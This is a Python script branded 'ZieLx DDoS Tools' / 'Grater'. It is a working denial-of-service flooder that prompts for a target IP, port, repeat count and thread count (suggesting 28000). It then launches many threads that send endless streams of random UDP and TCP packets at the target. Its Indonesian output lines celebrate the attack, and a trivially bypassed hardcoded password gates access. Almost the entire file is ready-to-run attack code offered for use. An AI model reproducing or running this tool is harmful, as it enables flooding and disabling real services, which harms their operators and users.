#RETAX
#grater
import random
import socket
import threading
import os
import sys
import time
from time import sleep

os.system("clear")
password ="grater"

for i in range(3):
	pwd = input("[•] Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] Correct...")
		break
	else:
		time.sleep(5)
		print("\033[91m[×] WRONG PASSWORD!!! ")
		continue
time.sleep(5)
print("[•] Your Account Has Been Accepted! \033[92m[√]\033[0m ")
time.sleep(5)
os.system("clear")


print("""/033[95m
   ____           _            
  / ___|_ __ __ _| |_ ___ _ __ 
 | |  _| '__/ _` | __/ _ \ '__|
 | |_| | | | (_| | ||  __/ |   
  \____|_|  \__,_|\__\___|_| 
  """)                            

print("\033[92m========= ZieLx DDoS Tools =========") 
print("\033[92m>> Author : ") 
print("\033[92m>>> Coded : XYTEL") 
print("\033[92m>>>> Don't Abuse Tools")
ip = str(input("[+] Ip/Host : "))
port = int(input("[-] Port : "))
choice = str(input("[+] Ready?? (ready/n) : "))
times = int(input("[-] Times : "))
threads = int(input("[+] Threads (28000) : "))
os.system("clear")
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m ADA YANG DDOS IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			print("\u001b[31m[×] ADA YANG DDOS IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def run2():
	data = random._urandom(1025)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ADA YANG DDOS IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] ADA YANG DDOS IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def run3():
	data = random._urandom(1025)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ADA YANG DDOS IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] ADA YANG DDOS IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def run4():
	data = random._urandom(1818)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m GRATER ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN GAK TUUH!!!")


def run5():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m ADA YANG DDOS IP\033[0m%s\033[91m ke TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN GAK TUUH!!!")


for y in range(threads):
	if choice == 'ready':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
else:
		th = threading.Thread(target = run5)
		th.start()
